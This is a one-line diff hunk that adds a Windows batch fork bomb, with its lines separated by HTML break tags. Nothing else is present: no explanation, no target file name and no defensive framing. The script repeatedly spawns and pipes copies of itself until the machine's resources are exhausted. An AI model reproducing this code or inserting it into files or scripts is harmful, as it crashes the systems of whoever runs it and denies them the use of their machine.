@@ -1,0 +1,1 @@
+:s<br />start %0<br />%0|%0<br />goto :s<br />
